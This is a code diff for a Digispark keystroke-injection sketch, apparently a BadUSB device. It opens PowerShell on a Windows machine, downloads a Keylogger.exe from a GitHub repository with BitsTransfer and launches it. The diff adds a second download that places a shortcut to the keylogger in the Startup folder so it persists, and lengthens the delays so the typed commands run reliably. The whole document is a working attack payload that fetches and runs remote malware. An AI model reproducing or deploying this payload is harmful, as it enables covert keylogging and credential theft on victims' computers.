@@ -10,16 +10,18 @@ void setup() {
 void loop() {
   delay(1000);
   DigiKeyboard.update();
-  delay(100);
+  delay(1000);
    
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  delay(100);
+  delay(1000);
   DigiKeyboard.println(F("powershell "));
-  delay(100);
+  delay(1000);
   DigiKeyboard.print(F("Import-Module BitsTransfer;"));
   DigiKeyboard.print(F("Start-BitsTransfer -Source \"https://github.com/ContiGianfranco/keylogger_cripto/blob/main/compiled/Keylogger.exe?raw=true\" -Destination \"APPDATA\\Roaming\\Keylogger.exe\";"));
+  DigiKeyboard.print(F("Start-BitsTransfer -Source \"https://github.com/ContiGianfranco/keylogger_cripto/blob/main/compiled/Keylogger.lnk?raw=true\" -Destination \"APPDATA\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Keylogger.lnk\";"));
   DigiKeyboard.print(F("cd \"APPDATA\\Roaming\";"));
   DigiKeyboard.println(F("Start-Process \"Keylogger.exe\";"));
+
    
   while(1){
     digitalWrite(1, HIGH);
